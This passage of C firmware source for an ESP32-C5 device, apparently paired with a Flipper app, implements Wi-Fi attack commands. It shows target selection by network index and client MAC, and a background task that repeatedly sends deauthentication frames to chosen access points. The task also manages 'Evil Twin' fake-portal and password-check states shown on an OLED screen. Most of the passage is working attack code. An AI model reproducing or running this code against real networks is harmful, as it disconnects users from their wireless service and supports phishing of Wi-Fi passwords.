Smethan/projectZero/ESP32C5/main/main.c
    g_selected_count = 0;
    for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
        int idx = atoi(argv[i]);
        idx--;//because flipper app uses indexes from 1
        if (idx < 0 || idx >= (int)g_scan_count) {
            ESP_LOGW(TAG,"Index %d out of bounds (0..%u)", idx, g_scan_count ? (g_scan_count - 1) : 0);
            continue;
        }
        g_selected_indices[g_selected_count++] = idx;
    }
    if (g_selected_count == 0) {
        ESP_LOGW(TAG,"First, run scan_networks.");
        return 1;
    }

    char buf[500];
    int len = snprintf(buf, sizeof(buf), "Selected Networks:\n");

    for (int i = 0; i < g_selected_count; ++i) {
        const wifi_ap_record_t* ap = &g_scan_results[g_selected_indices[i]];
        
        // I assume auth is available as a string in your structure, if not - replace with appropriate field or string.
        const char* auth = authmode_to_string(ap->authmode);

        // Formatting: SSID, BSSID, Channel, Auth
        len += snprintf(buf + len, sizeof(buf) - len, "%s, %02x:%02x:%02x:%02x:%02x:%02x, Ch%d, %s%s\n",
                        (char*)ap->ssid,
                        ap->bssid[0], ap->bssid[1], ap->bssid[2],
                        ap->bssid[3], ap->bssid[4], ap->bssid[5],
                        ap->primary, auth,
                        (i + 1 == g_selected_count) ? "" : "");
    }

    vTaskDelay(pdMS_TO_TICKS(100));
    MY_LOG_INFO(TAG, "%s", buf);
    vTaskDelay(pdMS_TO_TICKS(100));

    // Update OLED with rich target summary
    {
        char oled_l1[20];
        snprintf(oled_l1, sizeof(oled_l1), "> %d Target%s", g_selected_count, g_selected_count > 1 ? "s" : "");
        char oled_target[48];
        oled_build_target_summary(oled_target, sizeof(oled_target));
        char oled_ch[32];
        oled_build_channel_info(oled_ch, sizeof(oled_ch));
        oled_display_update_full(oled_l1, oled_target, oled_ch, "  > ready");
    }

    return 0;
}

static int cmd_unselect_networks(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Stop all running operations
    cmd_stop(0, NULL);
    
    // Clear network selection (but keep scan results)
    g_selected_count = 0;
    memset(g_selected_indices, 0, sizeof(g_selected_indices));
    
    MY_LOG_INFO(TAG, "Network selection cleared. Scan results preserved.");
    return 0;
}

static int cmd_select_stations(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: select_stations <MAC1> [MAC2] ...");
        MY_LOG_INFO(TAG, "Example: select_stations AA:BB:CC:DD:EE:FF 11:22:33:44:55:66");
        return 1;
    }
    
    if (selected_stations == NULL) {
        MY_LOG_INFO(TAG, "PSRAM not initialized for stations");
        return 1;
    }
    
    // Clear previous selection
    selected_stations_count = 0;
    memset(selected_stations, 0, MAX_SELECTED_STATIONS * sizeof(selected_station_t));
    
    // Parse MAC addresses
    for (int i = 1; i < argc && selected_stations_count < MAX_SELECTED_STATIONS; i++) {
        uint8_t mac[6];
        if (sscanf(argv[i], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6) {
            memcpy(selected_stations[selected_stations_count].mac, mac, 6);
            selected_stations[selected_stations_count].active = true;
            selected_stations_count++;
            MY_LOG_INFO(TAG, "Added station: %02X:%02X:%02X:%02X:%02X:%02X",
                       mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        } else {
            MY_LOG_INFO(TAG, "Invalid MAC format: %s (use AA:BB:CC:DD:EE:FF)", argv[i]);
        }
    }
    
    MY_LOG_INFO(TAG, "Selected %d station(s) for targeted deauth", selected_stations_count);
    return 0;
}

static int cmd_unselect_stations(int argc, char **argv) {
    (void)argc; (void)argv;
    selected_stations_count = 0;
    if (selected_stations != NULL) {
        memset(selected_stations, 0, MAX_SELECTED_STATIONS * sizeof(selected_station_t));
    }
    MY_LOG_INFO(TAG, "Station selection cleared. Deauth will use broadcast.");
    return 0;
}

int onlyDeauth = 0;

// Deauth attack task function (runs in background)
static void deauth_attack_task(void *pvParameters) {
    (void)pvParameters;
    
    //Main loop of deauth frames sending:
    while (deauth_attack_active && 
           ((applicationState == DEAUTH) || (applicationState == DEAUTH_EVIL_TWIN) || (applicationState == EVIL_TWIN_PASS_CHECK))) {
        // Check for stop request (check at start of loop for faster response)
        if (operation_stop_requested || !deauth_attack_active) {
            MY_LOG_INFO(TAG, "Deauth attack: Stop requested, terminating...");
            operation_stop_requested = false;
            deauth_attack_active = false;
            applicationState = IDLE;
            
            // Clean up after attack (ignore LED errors)
            esp_err_t led_err = led_set_idle();
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to restore idle LED after deauth stop: %s", esp_err_to_name(led_err));
            }
            
            break;
        }
        
        // Check if it's time for channel monitoring (every 5 minutes)
        // Only perform periodic re-scan during active deauth attacks (DEAUTH and DEAUTH_EVIL_TWIN)
        if ((applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) && check_channel_changes()) {
            // Set flag to suppress logs during periodic re-scan
            periodic_rescan_in_progress = true;
            
            if (applicationState == DEAUTH) {
                oled_display_update_full("> Deauth Attack", "  Re-scanning...", "  Channel check", "  Please wait");
            }
            
            // Set LED to yellow during re-scan
            esp_err_t led_err = led_set_color(255, 255, 0); // Yellow
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to set LED for periodic scan: %s", esp_err_to_name(led_err));
            }
            
            // Temporarily pause deauth for scanning
            esp_err_t scan_result = quick_channel_scan();
            if (scan_result != ESP_OK) {
                MY_LOG_INFO(TAG, "Quick channel re-scan failed: %s", esp_err_to_name(scan_result));
            }
            
            // Clear LED after re-scan (ignore errors if LED is in invalid state)
            led_err = led_clear();
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to clear LED after periodic scan: %s", esp_err_to_name(led_err));
            }
            
            // Clear flag after re-scan completes
            periodic_rescan_in_progress = false;
        }
        
        if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
            // Send deauth frames (silent mode - no UART spam)
            ESP_ERROR_CHECK(led_set_color(0, 0, 255));
            wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
            ESP_ERROR_CHECK(led_clear());
        }
        
        // Real-time OLED status update (rate-limited ~500ms)
        {
            static int64_t deauth_oled_last_us = 0;
            static int deauth_oled_rotate = 0;
            int64_t now_us = esp_timer_get_time();
            if (now_us - deauth_oled_last_us > 500000 && target_bssid_count > 0) {
                deauth_oled_last_us = now_us;
                if (applicationState == DEAUTH) {
                    int idx = deauth_oled_rotate % target_bssid_count;
                    char l2[64], l3[64], l4[64];
                    snprintf(l2, sizeof(l2), ">> %s", target_bssids[idx].ssid);
                    snprintf(l3, sizeof(l3), "  Ch %d  [%d/%d]", target_bssids[idx].channel, idx + 1, target_bssid_count);
                    if (selected_stations_count > 0) {
                        snprintf(l4, sizeof(l4), "  STA:%02X:%02X:%02X",
                                 selected_stations[0].mac[3], selected_stations[0].mac[4], selected_stations[0].mac[5]);
                    } else {
                        snprintf(l4, sizeof(l4), "  Deauthing...");
                    }
                    oled_display_update_full("> Deauth Attack", l2, l3, l4);
                    deauth_oled_rotate++;
                } else if (applicationState == DEAUTH_EVIL_TWIN) {
                    char l2[64], l4[64];
                    snprintf(l2, sizeof(l2), ">> %s", target_bssids[0].ssid);
                    if (last_password_wrong) {
                        snprintf(l4, sizeof(l4), "  Clients: %d", portal_connected_clients);
                        oled_display_update_full("> Evil Twin", l2, "  Wrong password!", l4);
                    } else {
                        snprintf(l4, sizeof(l4), "  Clients: %d", portal_connected_clients);
                        oled_display_update_full("> Evil Twin", l2, "  Portal active", l4);
                    }
                } else if (applicationState == EVIL_TWIN_PASS_CHECK) {
                    char l2[64], l4[64];
                    snprintf(l2, sizeof(l2), ">> %s", evilTwinSSID ? evilTwinSSID : "?");
                    snprintf(l4, sizeof(l4), "  Attempt %d/3", connectAttemptCount + 1);
                    oled_display_update_full("> Evil Twin", l2, "  Connecting...", l4);
                }
            }
        }
        
        // Delay and yield to allow UART console processing
        vTaskDelay(pdMS_TO_TICKS(100));
        taskYIELD(); // Give other tasks (including console) a chance to run
    }
    
    // Clean up LED after attack finishes naturally (ignore LED errors)
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after deauth task: %s", esp_err_to_name(led_err));
    }
    
    deauth_attack_active = false;
    deauth_attack_task_handle = NULL;
    
    // DO NOT clear target BSSIDs when attack ends - keep them for potential restart
    // target_bssid_count = 0;
    // memset(target_bssids, 0, MAX_TARGET_BSSIDS * sizeof(target_bssid_t));
    
